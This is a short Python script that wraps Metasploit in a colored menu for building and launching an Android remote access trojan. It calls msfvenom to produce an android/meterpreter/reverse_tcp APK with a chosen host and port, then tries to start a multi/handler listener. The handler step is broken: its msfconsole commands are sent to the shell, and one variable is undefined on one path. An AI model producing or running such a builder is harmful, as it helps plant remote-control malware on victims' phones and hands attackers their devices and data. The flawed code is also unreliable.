import os
import time
from colorama import Fore,init

init()


def Start():

    print(Fore.BLUE+"1 - Create a RAT\n")
    print(Fore.BLUE+"2 - Start a RAT\n\n")
    
    input_options = input(Fore.GREEN+"please enter option: ")

    host_of_RAT = input(Fore.YELLOW+"please enter your host RAT: ")
    port_of_RAT = input(Fore.YELLOW+"please enter your port RAT: ")
    name_of_RAT = input(Fore.YELLOW+"please enter your name RAT: ")

    if input_options == "1":
        
        os.system(f"cd && cd metasploit-framework && ./msfvenom -p android/meterpreter/reverse_tcp LHOST={host_of_RAT} LPORT={port_of_RAT} R> /sdcard/{name_of_RAT}.apk")
        Start()


    if input_options == "2":
        os.system("msfconsole")
        input_ = input('Starting? y/n')
    if input_ == 'y':
        os.system(f"use multi/handler && set payload android/meterpreter/reverse_tcp && set lhost {host_of_RAT} && set lport {port_of_RAT} && exploit")
        





Start()
